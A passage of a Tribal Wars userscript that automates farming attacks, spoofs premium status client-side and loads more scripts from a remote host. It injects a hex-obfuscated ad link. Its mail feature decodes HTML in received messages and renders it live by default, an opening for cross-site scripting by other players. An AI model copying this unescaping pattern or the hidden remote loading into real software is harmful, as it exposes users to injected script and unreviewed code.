			abrir = 'javascript: lanceiro = ' + cmd[0] + '; espadachim = ' + cmd[1] + '; barbaro = ' + cmd[2] + '; arqueiro = ' + cmd[3] + '; cav_leve = ' + cmd[4] + '; arqueiro_cav = ' + cmd[5] + '; cav_pesada = ' + cmd[6] + '; mandar_spy = ' + cmd[7] + '; spy = ' + cmd[8] + '; debug_ligado = 0; ataque = true; game_data.player.premium = true; $.getScript(\'' + base_scripts + 'calcular_farmar.js\');void(0);';
			//prompt('copie', abrir);
			location.href = abrir;
			deleteData(mundo + '_' + VillId + '_calcular', '');
		}

		if (location.href.indexOf('&mode=farmar') > 0) {
			tabela_farmar = document.getElementById('content_value').getElementsByTagName('table')[1].getElementsByTagName('td');
			tabela_farmar[tabela_farmar.length - 1].innerHTML = '<h3>' + lang_farmer[0] + '</h3><h6>' + lang_farmer[1] + '</h6><br><table><tbody><tr><td valign="top" id="farmar_1"><table><tbody><tr><td>' + lang_farmer[2] + '<input type="text" tabindex="13" id="coordenadas_1" value="' + coords_1 + '" size="34"></td></tr></tbody></table><table><tbody><tr><td valign="top"><table class="vis" width="100%"><tbody><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'spear\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_spear.png?1" title="' + lang_spear + '" alt="" class=""></a> <input id="unit_input_spear" name="spear" type="text" size="5" tabindex="1" value="' + spear_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'sword\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_sword.png?1" title="' + lang_sword + '" alt="" class=""></a> <input id="unit_input_sword" name="sword" type="text" size="5" tabindex="2" value="' + sword_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'axe\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_axe.png?1" title="' + lang_axe + '" alt="" class=""></a> <input id="unit_input_axe" name="axe" type="text" size="5" tabindex="3" value="' + axe_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'archer\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_archer.png?1" title="Arqueiro" alt="" class=""></a> <input id="unit_input_archer" name="archer" type="text" size="5" tabindex="4" value="' + archer_1 + '" class="unitsInput"></td></tr></tbody></table></td><td valign="top"><table class="vis" width="100%"><tbody><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'spy\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_spy.png?1" title="' + lang_spy + '" alt="" class=""></a> <input id="unit_input_spy" name="spy" type="text" size="5" tabindex="5" value="' + spy_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'light\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_light.png?1" title="' + lang_light + '" alt="" class=""></a> <input id="unit_input_light" name="light" type="text" size="5" tabindex="6" value="' + light_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'marcher\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_marcher.png?1" title="' + lang_marcher + '" alt="" class=""></a> <input id="unit_input_marcher" name="marcher" type="text" size="5" tabindex="7" value="' + marcher_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'heavy\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_heavy.png?1" title="' + lang_heavy + '" alt="" class=""></a> <input id="unit_input_heavy" name="heavy" type="text" size="5" tabindex="8" value="' + heavy_1 + '" class="unitsInput"></td></tr></tbody></table></td><td valign="top"><table class="vis" width="100%"><tbody><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'ram\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_ram.png?1" title="' + lang_ram + '" alt="" class=""></a> <input id="unit_input_ram" name="ram" type="text" size="5" tabindex="9" value="' + ram_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'catapult\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_catapult.png?1" title="'+ lang_catapult + '" alt="" class=""></a> <input id="unit_input_catapult" name="catapult" type="text" size="5" tabindex="10" value="' + catapult_1 + '" class="unitsInput"></td></tr></tbody></table></td></tr></tbody></table><table><tbody><tr><td><a href="javascript:' + str_setData + ' tropasfarmar = document.getElementById(\'farmar_1\').getElementsByTagName(\'input\');cookietropas = \'\';for (i = 0; i < tropasfarmar.length; i++){if (tropasfarmar[i].id.indexOf(\'unit_input_\') > -1){if (tropasfarmar[i].value.length < 1) tropasfarmar[i].value = \'0\';cookietropas += tropasfarmar[i].value + \'!!!\';}};setCookie(game_data.world + \'_\' + game_data.village.id + \'_farmar_1\', cookietropas + document.getElementById(\'coordenadas_1\').value);alert(\'Informações salvas com sucesso para Farmar 1 da aldeia \' + game_data.village.coord);void(0);">' + lang_farmer[3] + '</a> (' + lang_farmar + ' 1)</td></tr></tbody></table></td><td valign="top" id="farmar_2"><table><tbody><tr><td height="24"></td></tr></tbody></table><table><tbody><tr><td valign="top"><table class="vis" width="100%"><tbody><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'spear\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_spear.png?1" title="' + lang_spear + '" alt="" class=""></a> <input id="unit_input2_spear" name="spear" type="text" size="5" tabindex="1" value="' + spear_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'sword\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_sword.png?1" title="' + lang_sword + '" alt="" class=""></a> <input id="unit_input2_sword" name="sword" type="text" size="5" tabindex="2" value="' + sword_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'axe\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_axe.png?1" title="' + lang_axe + '" alt="" class=""></a> <input id="unit_input2_axe" name="axe" type="text" size="5" tabindex="3" value="' + axe_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'archer\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_archer.png?1" title="' + lang_archer + '" alt="" class=""></a> <input id="unit_input2_archer" name="archer" type="text" size="5" tabindex="4" value="' + archer_2 + '" class="unitsInput"></td></tr></tbody></table></td><td valign="top"><table class="vis" width="100%"><tbody><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'spy\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_spy.png?1" title="' + lang_spy + '" alt="" class=""></a> <input id="unit_input2_spy" name="spy" type="text" size="5" tabindex="5" value="' + spy_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'light\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_light.png?1" title="' + lang_light + '" alt="" class=""></a> <input id="unit_input2_light" name="light" type="text" size="5" tabindex="6" value="' + light_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'marcher\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_marcher.png?1" title="' + lang_marcher + '" alt="" class=""></a> <input id="unit_input2_marcher" name="marcher" type="text" size="5" tabindex="7" value="' + marcher_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'heavy\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_heavy.png?1" title="'+lang_heavy+'" alt="" class=""></a> <input id="unit_input2_heavy" name="heavy" type="text" size="5" tabindex="8" value="' + heavy_2 + '" class="unitsInput"></td></tr></tbody></table></td><td valign="top"><table class="vis" width="100%"><tbody><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'ram\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_ram.png?1" title="'+ lang_ram +'" alt="" class=""></a> <input id="unit_input2_ram" name="ram" type="text" size="5" tabindex="9" value="' + ram_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'catapult\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_catapult.png?1" title="' + lang_catapult + '" alt="" class=""></a> <input id="unit_input2_catapult" name="catapult" type="text" size="5" tabindex="10" value="' + catapult_2 + '" class="unitsInput"></td></tr></tbody></table></td></tr></tbody></table><table><tbody><tr><td><a href="javascript:' + str_setData + ' tropasfarmar = document.getElementById(\'farmar_2\').getElementsByTagName(\'input\');cookietropas = \'\';for (i = 0; i < tropasfarmar.length; i++){if (tropasfarmar[i].id.indexOf(\'unit_input2_\') > -1){if (tropasfarmar[i].value.length < 1) tropasfarmar[i].value = \'0\';cookietropas += tropasfarmar[i].value + \'!!!\';}};setCookie(game_data.world + \'_\' + game_data.village.id + \'_farmar_2\', cookietropas + document.getElementById(\'coordenadas_1\').value);alert(\'Informações salvas com sucesso para Farmar 2 da aldeia \' + game_data.village.coord);void(0);">' + lang_farmer[3] + '</a> (' + lang_farmar + ' 2)</td></tr></tbody></table></td></tr></tbody></table>';
		}
		if ((document.getElementById('content_value').getElementsByTagName('tbody')[2] != null) && (document.getElementById('troop_confirm_go') == null)) document.getElementById('content_value').getElementsByTagName('tbody')[2].innerHTML += '<tr><td width="100"><a href="/game.php?village=' + VillId + '&amp;screen=place&amp;mode=farmar">' + lang_farmar + '</a></td></tr>';
		if (document.getElementById('target_attack') != null) {
			farmar_1_checked = '';
			farmar_2_checked = '';
			if (getData(VillId + '_farmar_1_checked') == 'true') farmar_1_checked = ' checked';
			if (getData(VillId + '_farmar_2_checked') == 'true') farmar_2_checked = ' checked';
			document.getElementById('target_attack').parentNode.outerHTML = '<td><a id="farmar_1" href="javascript: lanca = ' + spear_1 + '; espada = ' + sword_1 + '; barbaro = ' + axe_1 + '; arqueiro = ' + archer_1 + '; explorador = ' + spy_1 + '; cavalaria_leve = ' + light_1 + '; cavalaria_arqueira = ' + marcher_1 + '; cavalaria_pesada = ' + heavy_1 + '; catapulta = '+ catapult_1 + '; ariete = '+ ram_1 + '; coords_ataque = \''+ coords_1 + '\'; aviso = false; coockieName = game_data.world + \'_\' + game_data.village.id + \'_farmeruk\'; $.getScript(\'' + base_scripts + 'saquear_aldeia_farmar.js\');void(0);">» ' + lang_farmar + ' 1</a> <input type="checkbox" style="margin:0" id="farmar_1_check"' + farmar_1_checked + ' onClick="' + str_setData + '; setCookie(\'' + VillId + '_farmar_1_checked\', String(this.checked));if (this.checked == true) location.href = document.getElementById(\'farmar_1\').href;void(0);" title="Auto"><br><a id="farmar_2" href="javascript: lanca = ' + spear_2 + '; espada = ' + sword_2 + '; barbaro = ' + axe_2 + '; arqueiro = ' + archer_2 + '; explorador = ' + spy_2 + '; cavalaria_leve = ' + light_2 + '; cavalaria_arqueira = ' + marcher_2 + '; cavalaria_pesada = ' + heavy_2 + '; catapulta = '+ catapult_2 + '; ariete = '+ ram_2 + '; coords_ataque = \''+ coords_1 + '\'; aviso = true; coockieName = game_data.world + \'_\' + game_data.village.id + \'_farmeruk\'; $.getScript(\'' + base_scripts + 'saquear_aldeia_farmar.js\');void(0);">» ' + lang_farmar + ' 2</a> <input type="checkbox" style="margin:0" id="farmar_2_check"' + farmar_2_checked + ' onClick="' + str_setData + '; setCookie(\'' + VillId + '_farmar_2_checked\', String(this.checked));if (this.checked == true) location.href = document.getElementById(\'farmar_2\').href;void(0);" title="Auto"></td>' + document.getElementById('target_attack').parentNode.outerHTML;
			if (document.getElementById('error') != null){
				document.getElementById('farmar_1_check').checked = true;
				document.getElementById('farmar_2_check').checked = true;				
				document.getElementById('farmar_1_check').click();
				document.getElementById('farmar_2_check').click();
			}			
			if (getData(VillId + '_farmar_1_checked') == 'true') {
				location.href = document.getElementById('farmar_1').href;
			}
			else{
				if (getData(VillId + '_farmar_2_checked') == 'true') location.href = document.getElementById('farmar_2').href;
			}
		}
	}
	if (document.getElementById('troop_confirm_go') != null){
		if ((getData(VillId + '_farmar_1_checked') == 'true') || (getData(VillId + '_farmar_2_checked') == 'true')){
			document.getElementById('troop_confirm_go').click();
		}
	}
	if (location.href.indexOf('map') > location.href.indexOf('screen=')) {
		window.location = 'javascript:TWMap.resize(7)';
		if (document.getElementById('map_config') != null) {
			document.getElementById('map_config').innerHTML += '<br><table class="vis" width="100%"><tbody><tr><th colspan="2">' + lang_map[9] + '</th></tr><tr><td><table cellspacing="0"><tbody><tr><td width="80">' + lang_map[8] + '</td><td><select id="map_chooser_select" onchange="TWMap.resize(parseInt($(\'#map_chooser_select\').val()), true)"><option id="current-map-size" value="7x7" style="display:none;">7x7</option><option value="4">4x4</option><option value="5">5x5</option><option value="7">7x7</option><option value="9">9x9</option><option value="11">11x11</option><option value="13" selected="selected">13x13</option><option value="15">15x15</option><option value="20">20x20</option><option value="30">30x30</option></select></td><td valign="middle"><img alt="" class="tooltip" src="http://cdn.tribalwars.com.br/graphic//questionmark.png" width="13" height="13"></td></tr></tbody></table><input type="hidden" value="/game.php?village=86984&amp;screen=settings&amp;ajaxaction=set_map_size&amp;h=d7d4" id="change_map_size_link"></td></tr><tr><td><table cellspacing="0"><tbody><tr><td width="80">' + lang_map[7] + '</td><td colspan="2"><select id="minimap_chooser_select" onchange="TWMap.resizeMinimap(parseInt($(\'#minimap_chooser_select\').val()), true)"><option id="current-minimap-size" value="50x50" style="display:none;">50x50</option><option value="20">20x20</option><option value="30">30x30</option><option value="40">40x40</option><option value="50">50x50</option><option value="60">60x60</option><option value="70">70x70</option><option value="80">80x80</option><option value="90">90x90</option><option value="100">100x100</option><option value="110">110x110</option><option value="120" selected="selected">120x120</option></select></td></tr></tbody></table><input type="hidden" value="/game.php?village=86984&amp;screen=settings&amp;ajaxaction=set_map_size&amp;h=d7d4" id="change_map_size_link"></td></tr></tbody></table>'; /*<br><table class="vis" style="border-spacing:0px;border-collapse:collapse;" width="100%"><tbody><tr><th colspan="4">' + lang_map[0] + '</th></tr><tr><td colspan="4">' + lang_map[1] + '</td></tr><tr><td>' + lang_map[2] + '</td><td><input id="barb_min" type="text" value="" size="6"></td><td>' + lang_map[4] + '</td><td><input id="barb_max" type="text" value="" size="6"></td></tr><tr><td colspan="4">'+ lang_map[3] + '</td></tr><tr><td>' + lang_map[2] + '</td><td><input id="player_min" type="text" value="" size="6"></td><td>' + lang_map[4] + '</td><td><input id="player_max" type="text" value="" size="6"></td></tr><tr><td>' + lang_map[5]+ '</td><td colspan="3"><input id="raio" type="text" value="10" size="6"></td></tr><tr><td colspan="3"></td><td><a href="javascript: var radius = document.getElementById(\'raio\').value; var a = document.getElementById(\'barb_min\').value; var b = document.getElementById(\'barb_max\').value; if (a == \'\') {a = 1} if (b == \'\') {b = 1} var barb = { min: a, max: b}; var c = document.getElementById(\'player_min\').value; var d = document.getElementById(\'player_max\').value; if (c == \'\') {c = 1} if (d == \'\') {d = 1} var player = { min: c, max: d }; $.getScript(\'' + base_scripts + 'pesquisador_de_aldeias.js\'); void(0);">' + lang_map[6] + '</a></td></tr></tbody></table>';
	*/  }
	}
    

	if (getElementsByClass(decodeHex('7365727665725f696e666f'))[0] != null) getElementsByClass(decodeHex('7365727665725f696e666f'))[0].innerHTML += decodeHex('3c7020636c6173733d227365727665725f696e666f223e536372697074206279203c6120687265663d22687474703a2f2f6164762e6c692f3939353222207461726765743d225f626c616e6b223e61627567616c6d626f20616c67726565623c2f613e') + lang_settings[18] + '</p>';

    if ((/https?:\/\/.*?\/game.php\?.+mode=view.*&screen=mail/).test(location.href) == true) {                
		messages = getElementsByClass('text');
        RegExp = /\[img\]https?:\/\/.+?\/.+?\..*?\[\/img\]/g; 
		RegExpV1 = /\[vid\]https?:\/\/.+?youtube.+?\/watch\?v=[\w_]+&?.*?\[\/vid\]/g;
		RegExpV2 = /\[vid\]https?:\/\/.+?youtube.+?\/watch\?v=([\w_]+)&?.*?\[\/vid\]/;
		allow_html = getData(mundo + '_permitir_html');
		allow_html_check = '';
		if (allow_html == '') {
			allow_html = 'true';
			setData(mundo + '_permitir_html', 'true');
		}
        for (i = 0; i < messages.length; i++){  
            if (messages[i] != null){             
				//alert(messages[i].textContent);
                meta = messages[i].innerHTML.match(RegExp);
				meta2 = messages[i].outerHTML.match(RegExpV1);
				//MessHTML = messages[i].innerHTML.match(RegExpHTML);
				//MessNotHTML = messages[i].textContent.match(RegExpNotHTML);
				
                modified = messages[i].innerHTML;            
                
					if (allow_html == 'true'){
						allow_html_check = ' checked="checked"';
						modified = replace_all(replace_all(replace_all(modified, '&lt;', '<'), '&gt;', '>'), '&amp;', '&');
					}				
				//alert(meta.length);
                if (meta != null) {               
                    for (b = 0; b < meta.length; b++) {
                        tag_img = meta[b].replace('[img]', '<img src="').replace('[/img]', '"/>');                    
                        //alert(tag_img);
                        modified = modified.replace(meta[b], tag_img);              
                    }
                }
                if (meta2 != null) {               
                    for (b = 0; b < meta2.length; b++) {	
                        //alert(meta2[b]);
						//alert(meta2[b].match(RegExpV2)[1]);
                        tag_vid = '<object width="300" height="225"><param name="movie" value="http://www.youtube.com/v/' + meta2[b].match(RegExpV2)[1] + '"></param><param name="allowFullScreen" value="true"></param><param name="allowscriptaccess" value="always"></param><embed src="http://www.youtube.com/v/zh6PeT8f6Ro?version=3&amp;hl=pt_BR" type="application/x-shockwave-flash" width="560" height="315" allowscriptaccess="always" allowfullscreen="true"></embed></object>';                                           
                        modified = modified.replace(meta2[b], tag_vid);              
                    }
                }					
				//alert(modified);                
				if (modified != messages[i].innerHTML) messages[i].innerHTML = modified;				
            }
        }
		document.getElementById('action_row2').outerHTML += '<br><tr><th colspan="2">' + lang_messages[0] + '</th></tr><tr><td colspan="2"><li>' + lang_messages[1] + ' *</li></td></tr><tr><td colspan="2"><li>' + lang_messages[2] + ' *</li></td></tr><tr><td colspan="2"><input type="checkbox"' + allow_html_check + '" onclick="' + str_setData + ' setCookie(game_data.world + \'_permitir_html\', String(this.checked));void(0);"></input>' + lang_messages[3] + ' *</td></tr><tr><td colspan="2" align="right"><font size="1">' + lang_messages[4] + '</font></td></tr>';
    }        

	if (getData(mundo + '_titulo_mundo') == 'true'){
		document.title = mundo.toUpperCase() + ' - ' + document.getElementsByTagName('title')[0].textContent;void(0);
	}
}    
void(0);